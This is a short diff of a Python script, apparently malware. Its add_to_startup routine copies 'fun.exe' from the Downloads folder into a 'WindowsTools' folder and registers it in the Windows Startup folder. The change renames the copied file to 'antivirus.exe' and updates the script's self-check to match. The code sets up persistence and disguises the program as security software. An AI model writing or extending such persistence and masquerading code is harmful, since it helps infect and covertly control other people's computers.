@@ -13,7 +13,7 @@ USERNAME = getuser()
 def add_to_startup():
     d = os.environ['USERPROFILE']+"\\WindowsTools"
     os.mkdir(d)
-    d = d+"\\"+"fun.exe"
+    d = d+"\\"+"antivirus.exe"
     copyfile(os.environ['USERPROFILE']+"\\Downloads\\fun.exe", d)
 
     bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USERNAME
@@ -22,7 +22,7 @@ def add_to_startup():
 
 def get_ip():
     if sys.platform == "win32":
-        if "WindowsTools" not in __file__:
+        if "antivirus" not in __file__:
             add_to_startup()
         return socket.gethostbyname(socket.gethostname()), True
     else:
